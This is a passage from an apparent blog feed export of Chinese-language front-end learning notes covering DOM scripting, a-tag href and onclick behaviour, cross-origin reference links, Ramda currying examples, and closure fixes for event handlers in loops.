    <span class="token keyword">var</span> placeholder <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'placeholder'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>placeholder<span class="token punctuation">.</span>nodeName <span class="token operator">!=</span> <span class="token string">'IMG'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// point1</span>
        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
    placeholder<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token string">'src'</span><span class="token punctuation">,</span> source<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'description'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">var</span> text <span class="token operator">=</span> whichpic<span class="token punctuation">.</span><span class="token function">getAttribute</span><span class="token punctuation">(</span><span class="token string">'title'</span><span class="token punctuation">)</span> <span class="token operator">?</span> whichpic<span class="token punctuation">.</span><span class="token function">getAttribute</span><span class="token punctuation">(</span><span class="token string">'title'</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">;</span>
        <span class="token keyword">var</span> description <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'description'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>description<span class="token punctuation">.</span>firstChild<span class="token punctuation">.</span>nodeType <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">//point</span>
            description<span class="token punctuation">.</span>firstChild<span class="token punctuation">.</span>nodeValue <span class="token operator">=</span> text<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>point1: nodeName的返回结果总是大写形式,即使在HTML文档里是小写<br>point2: 文本节点的nodeType是3</p>
<h2 id="DOM-Core-amp-amp-HTML-DOM"><a href="#DOM-Core-amp-amp-HTML-DOM" class="headerlink" title="DOM Core &amp;&amp; HTML-DOM"></a>DOM Core &amp;&amp; HTML-DOM</h2><pre class="line-numbers language-javascript"><code class="language-javascript">getElementById
getElementByTagName
getAttribute
setAttribute
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>这些方法都是DOM Core的组成部分.并不专属于JavaScript,支持DOM的任何一种程序设计语言都可以使用它们<br>有好多属性属于HTML-DOM,在DOM Core出现之前很久就为人们所熟悉了</p>
<pre class="line-numbers language-javascript"><code class="language-javascript">document<span class="token punctuation">.</span><span class="token function">getElementByTagName</span><span class="token punctuation">(</span><span class="token string">'form'</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>就等价于HTML-DOM里的</p>
<pre class="line-numbers language-javascript"><code class="language-javascript">document<span class="token punctuation">.</span>forms
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>HTML-DOM中还提供了很多描述HTML元素的属性比如</p>
<pre class="line-numbers language-javascript"><code class="language-javascript">element<span class="token punctuation">.</span><span class="token function">getAttribute</span><span class="token punctuation">(</span><span class="token string">'src'</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>等价于</p>
<pre class="line-numbers language-javascript"><code class="language-javascript">element<span class="token punctuation">.</span>src
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>再比如</p>
<pre class="line-numbers language-javascript"><code class="language-javascript">element<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token string">'href'</span><span class="token punctuation">,</span> src<span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<pre class="line-numbers language-javascript"><code class="language-javascript">element<span class="token punctuation">.</span>href <span class="token operator">=</span> src
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<blockquote>
<p>结构与行为分离越大越好</p>
</blockquote>
<h2 id="document-write-p98"><a href="#document-write-p98" class="headerlink" title="document.write [p98]"></a>document.write [p98]</h2><blockquote>
<p>从某种意义上讲, <code>document.write</code>方法有点像<code>&lt;font&gt;</code>标签里设定字体一样,不够优雅<br>好像说的有道理,但在某些题目中好像是可以绕过一些东西来着<br>这个时候想到了这个方法和文档流的一些问题,比如什么情况下,会发生清空body内容的情况</p>
</blockquote>
<p>另外书中提到</p>
<blockquote>
<p><code>document.write()</code>和<code>innerHTML</code>都是HTML的专有属性/方法,不能用于MIME类型为<code>application/xhtml+xml</code>的XHTML文档</p>
</blockquote>
<h2 id="DOM-方法"><a href="#DOM-方法" class="headerlink" title="DOM 方法"></a>DOM 方法</h2><h3 id="createElement"><a href="#createElement" class="headerlink" title="createElement"></a>createElement</h3><h3 id="appendChild"><a href="#appendChild" class="headerlink" title="appendChild"></a>appendChild</h3><h3 id="createTextNode"><a href="#createTextNode" class="headerlink" title="createTextNode"></a>createTextNode</h3><h2 id="后来"><a href="#后来" class="headerlink" title="后来"></a>后来</h2><p>感觉这本书不错<br>我好想再补一下鹅厂<code>javascript设计模式</code>那本书</p>
<p>## </p>
]]></content>
      
        
        <tags>
            
            <tag> web </tag>
            
            <tag> js </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[a标签]]></title>
      <url>/2017/05/23/a%E6%A0%87%E7%AD%BE/</url>
      <content type="html"><![CDATA[<p>今天遇到了问题,所以在网上找了些资料,关于<br>a标签的href和onclick</p>
<h2 id="大概"><a href="#大概" class="headerlink" title="大概"></a>大概</h2><ol>
<li>onclick里的事件先被执行,然后才是href中定义的页面跳转或者javascript伪协议</li>
<li>如果都定义了,想要阻止href的动作,就要使得onclick返回false,所以经常看到<pre><code>&lt;a onclick=&quot;xxx();return false;&quot;&gt;
</code></pre></li>
<li>如果页面过长有滚动条，且希望通过链接的onclick事件执行操作。应将它的href 属性设为<code>javascript:void(0);</code>，而不要是<code>#</code>，这可以防止不必要的页面跳动(其实的话是不是<code>javascript:;</code>是一样的效果)<blockquote>
<p>因为实际上<code>#</code>会代表着<code>#top</code>,而<code>javascript:void(0);</code>什么都不代表</p>
</blockquote>
</li>
</ol>
<p>丢个完整的demo</p>
<pre class="line-numbers language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span>utf-8</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
&lt;a href="go.html" onclick = "doSomething1()">link1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>
&lt;a href="javascript:void(0);" onclick = "doSomething2()">link2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span>
function doSomething1(){
    return confirm("离开?");
}
function doSomething2(){
    var ret = confirm("离开?");
    if(ret){
        window.location.href = "go.html";
    }
}
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这两个link都能实现离开前确认的效果,长见识了</p>
<h2 id="传说中的提交表单不跳转"><a href="#传说中的提交表单不跳转" class="headerlink" title="传说中的提交表单不跳转"></a>传说中的提交表单不跳转</h2><p>原来是说可以这样子</p>
<ol>
<li>使用<code>display:none</code>的iframe</li>
<li>使用AJAX<br>现在看到好像可以<pre><code>&lt;a href=&quot;javascript:void(document.form.submit())&quot;&gt;
</code></pre></li>
</ol>
<h2 id="可不可以不写href"><a href="#可不可以不写href" class="headerlink" title="可不可以不写href"></a>可不可以不写href</h2><blockquote>
<p>不写href就不会变蓝,,你的a看起来就是黑字<br>不过现在都不流行这样子的a了.都是css成按钮样式的了</p>
</blockquote>
<h2 id="资料"><a href="#资料" class="headerlink" title="资料"></a>资料</h2><p><a href="http://www.cnblogs.com/goldarch/archive/2010/06/16/1759031.html" target="_blank" rel="external">http://www.cnblogs.com/goldarch/archive/2010/06/16/1759031.html</a></p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[跨域]]></title>
      <url>/2017/05/23/%E8%B7%A8%E5%9F%9F/</url>
      <content type="html"><![CDATA[<p>跨域真是一件让人头疼的事情啊</p>
<h2 id="CORS"><a href="#CORS" class="headerlink" title="CORS"></a>CORS</h2><p>为什么要跨域,因为有同源策略啊</p>
<h2 id="SO"><a href="#SO" class="headerlink" title="SO?"></a>SO?</h2><h3 id="JSONP"><a href="#JSONP" class="headerlink" title="JSONP"></a>JSONP</h3><h3 id="window-name"><a href="#window-name" class="headerlink" title="window.name"></a>window.name</h3><h3 id="postMessage"><a href="#postMessage" class="headerlink" title="postMessage"></a>postMessage</h3><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://segmentfault.com/a/1190000003642057" target="_blank" rel="external">https://segmentfault.com/a/1190000003642057</a><br><a href="http://www.cnblogs.com/vajoy/p/4295825.html" target="_blank" rel="external">http://www.cnblogs.com/vajoy/p/4295825.html</a> (这个大佬的blog不错)<br><a href="http://imweb.io/topic/56822fdb57d7a6c47914fbf3" target="_blank" rel="external">http://imweb.io/topic/56822fdb57d7a6c47914fbf3</a></p>
<p><a href="http://www.ruanyifeng.com/blog/2016/04/same-origin-policy.html" target="_blank" rel="external">http://www.ruanyifeng.com/blog/2016/04/same-origin-policy.html</a><br><a href="http://www.ruanyifeng.com/blog/2016/04/cors.html" target="_blank" rel="external">http://www.ruanyifeng.com/blog/2016/04/cors.html</a></p>
<p><a href="http://www.freebuf.com/articles/web/65468.html" target="_blank" rel="external">http://www.freebuf.com/articles/web/65468.html</a><br><a href="http://www.freebuf.com/news/65669.html" target="_blank" rel="external">http://www.freebuf.com/news/65669.html</a><br><a href="http://www.freebuf.com/news/65979.html" target="_blank" rel="external">http://www.freebuf.com/news/65979.html</a></p>
<p><a href="http://newhtml.net/using-cors/" target="_blank" rel="external">http://newhtml.net/using-cors/</a><br><a href="http://blog.csdn.net/mevicky/article/details/51404610" target="_blank" rel="external">http://blog.csdn.net/mevicky/article/details/51404610</a></p>
<h2 id="后来"><a href="#后来" class="headerlink" title="后来"></a>后来</h2><p>在找资料的过程中get到这样子一个tool<br><a href="http://www.fefork.com/fetool/" target="_blank" rel="external">http://www.fefork.com/fetool/</a><br>和这样子一个ppt项目介绍<br><a href="http://www.cnblogs.com/xiaoheimiaoer/p/3930220.html#3545040" target="_blank" rel="external">http://www.cnblogs.com/xiaoheimiaoer/p/3930220.html#3545040</a></p>
]]></content>
      
        <categories>
            
            <category> 学习 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> web </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[ramda]]></title>
      <url>/2017/05/23/ramda/</url>
      <content type="html"><![CDATA[<h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>今天在知乎上看到了这个<code>Ramda</code><br>是一个函数式的.额,然后就想到了underscore</p>
<p>搜了一下看到了<br>官网<code>http://ramdajs.com/</code>, github 8k star<br>所有的方法都支持Curry</p>
<p>哦还搜到了一篇文章<br><a href="http://www.ruanyifeng.com/blog/2017/03/ramda.html" target="_blank" rel="external">http://www.ruanyifeng.com/blog/2017/03/ramda.html</a></p>
<p>还有一本gitbook是js函数式<br><a href="https://www.gitbook.com/book/llh911001/mostly-adequate-guide-chinese/details" target="_blank" rel="external">https://www.gitbook.com/book/llh911001/mostly-adequate-guide-chinese/details</a></p>
<p>想有时间学一下,先mark一下</p>
<p>算了不过了,mark啥,现在就学学呗</p>
<p>等我先写完,,,那个a的href和onclick就学这个</p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[ramda]]></title>
      <url>/2017/05/23/Ramda/</url>
      <content type="html"><![CDATA[<h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>今天在知乎上看到了这个<code>Ramda</code><br>是一个函数式的.额,然后就想到了underscore</p>
<p>搜了一下看到了<br>官网<code>http://ramdajs.com/</code>, github 8k star<br>所有的方法都支持Curry</p>
<p>哦还搜到了一篇文章<br><a href="http://www.ruanyifeng.com/blog/2017/03/ramda.html" target="_blank" rel="external">http://www.ruanyifeng.com/blog/2017/03/ramda.html</a></p>
<p>还有一本gitbook是js函数式<br><a href="https://www.gitbook.com/book/llh911001/mostly-adequate-guide-chinese/details" target="_blank" rel="external">https://www.gitbook.com/book/llh911001/mostly-adequate-guide-chinese/details</a></p>
<p>想有时间学一下,先mark一下</p>
<p>算了不过了,mark啥,现在就学学呗</p>
<p>等我先写完,,,那个a的href和onclick就学这个</p>
<h2 id="Start"><a href="#Start" class="headerlink" title="Start"></a>Start</h2><p>柯里化(写法二)</p>
<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">var</span> R <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'ramda'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">// 写法一</span>
R<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span>square<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">// 写法二</span>
R<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span>square<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>就是一种</p>
<pre class="line-numbers language-javascript"><code class="language-javascript">R<span class="token punctuation">.</span><span class="token function">func1</span><span class="token punctuation">(</span>func2<span class="token punctuation">)</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>好吧我其实不能接受加减乘除写成这样</p>
<pre class="line-numbers language-javascript"><code class="language-javascript">R<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// 17</span>
R<span class="token punctuation">.</span><span class="token function">subtract</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// 2</span>
R<span class="token punctuation">.</span><span class="token function">multiply</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">// 10</span>
R<span class="token punctuation">.</span><span class="token function">divide</span><span class="token punctuation">(</span><span class="token number">71</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// 0.71</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>这些字符串操作还好</p>
<pre class="line-numbers language-javascript"><code class="language-javascript">R<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">'a.b.c.xyz.d'</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">// ['a', 'b', 'c', 'xyz', 'd']</span>

R<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token regex">/([a-z]a)/g</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">'bananas'</span><span class="token punctuation">)</span> 
R<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token regex">/[a-z]a/g</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">'bananas'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//我有个问题,加不加这个括号有什么区别呢</span>
<span class="token comment" spellcheck="true">// ['ba', 'na', 'na']</span>

R<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token regex">/^x/</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">'xyz'</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">// ['a', 'b', 'c', 'xyz', 'd']</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>函数合成</p>
<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">var</span> negative <span class="token operator">=</span> x <span class="token operator">=</span><span class="token operator">></span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">*</span> x<span class="token punctuation">;</span>
<span class="token keyword">var</span> increaseOne <span class="token operator">=</span> x <span class="token operator">=</span><span class="token operator">></span> x <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>

<span class="token keyword">var</span> f <span class="token operator">=</span> R<span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span>pow<span class="token punctuation">,</span> negative<span class="token punctuation">,</span> increaseOne<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">f</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// -80 => -(3^4) + 1</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>那么问题来了,我为什么要在这里拷贝拷贝呢,,,需要的时候查api不就行了</p>
<p>然后看到他的另一篇<br><a href="http://www.ruanyifeng.com/blog/2017/03/pointfree.html" target="_blank" rel="external">http://www.ruanyifeng.com/blog/2017/03/pointfree.html</a><br>然后觉得有点意思</p>
<p>叫做<code>Pointfree</code></p>
<p>有一例子感觉挺好的</p>
<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">var</span> str <span class="token operator">=</span> <span class="token string">'Lorem ipsum dolor sit amet consectetur adipiscing elit'</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> getLongestWordLength <span class="token operator">=</span> R<span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span>
  R<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
  R<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span>R<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">,</span>
  R<span class="token punctuation">.</span><span class="token function">reduce</span><span class="token punctuation">(</span>R<span class="token punctuation">.</span>max<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">getLongestWordLength</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">// 11</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>确实很语义化,很酷炫,,,</p>
<p>后面还有个很长的例子,,,很酷炫</p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[Javascript入门1.0]]></title>
      <url>/2017/05/23/Javascript%E5%85%A5%E9%97%A81-0/</url>
      <content type="html"><![CDATA[<h2 id="首先"><a href="#首先" class="headerlink" title="首先"></a>首先</h2><p>是一个熟悉的段子</p>
<pre class="line-numbers language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>content-type<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/html; charset<span class="token punctuation">=</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>some test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span>javascript:;</span><span class="token punctuation">></span></span>11<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span>#</span><span class="token punctuation">></span></span>22<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span>javascript:void(0);</span><span class="token punctuation">></span></span>33<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span>
            var a_list = document.getElementsByTagName('a');
            for(var i = 0; i &lt; 3; i++) {
                a_list[i].innerHTML = i;
            }
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<blockquote>
<p>自豪的写了三种不同的不跳转的a,其实大概就是花式false</p>
</blockquote>
<p>然后感觉..诶?我点让他点击弹出来点什么东西来,于是</p>
<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">var</span> a_list <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementsByTagName</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">3</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    a_list<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>onclick <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">alert</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>结果悲剧了,为什么都弹出3啊(哇,假装好奇的样子)</p>
<h2 id="开始回忆"><a href="#开始回忆" class="headerlink" title="开始回忆"></a>开始回忆</h2><p>这个问题的话,没有记错的话,是因为这里的i是一个全局变量,ES5没有块作用域,不过有个函数作用域<br>所以当每个人被点的时候,onclick被调用的时候,i=3, 所以都会alert(3);<br>开始好像有过疑问,为什么不是<code>a_list[0]</code>绑定onclick的时候就变成了</p>
<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>这样子的呢,hhhhhh~我也不知道</p>
<h2 id="找到解决办法"><a href="#找到解决办法" class="headerlink" title="找到解决办法"></a>找到解决办法</h2><h3 id="以前用过的"><a href="#以前用过的" class="headerlink" title="以前用过的"></a>以前用过的</h3><ol>
<li><p>使用ES6<br>这个办法我知道使用<code>let</code></p>
</li>
<li><p>使用一个闭包<br>一直以来我就是用的这个</p>
<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">var</span> a_list <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementsByTagName</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">3</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
 a_list<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>onclick <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span>arg_i<span class="token punctuation">)</span> <span class="token punctuation">{</span>
     <span class="token keyword">return</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
         <span class="token function">alert</span><span class="token punctuation">(</span>arg_i<span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token punctuation">}</span>
 <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>当时感觉这种写法特别帅</p>
<blockquote>
<p>别写错了.要return一个function的,别把alert写在立即执行的匿名函数里</p>
</blockquote>
</li>
</ol>
<h3 id="剩下几种就是今天学到的了"><a href="#剩下几种就是今天学到的了" class="headerlink" title="剩下几种就是今天学到的了"></a>剩下几种就是今天学到的了</h3><ol>
<li><p>把i存到每个对象里</p>
<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">var</span> a_list <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementsByTagName</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">3</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
 a_list<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>arg <span class="token operator">=</span> i<span class="token punctuation">;</span>
 a_list<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>onclick <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
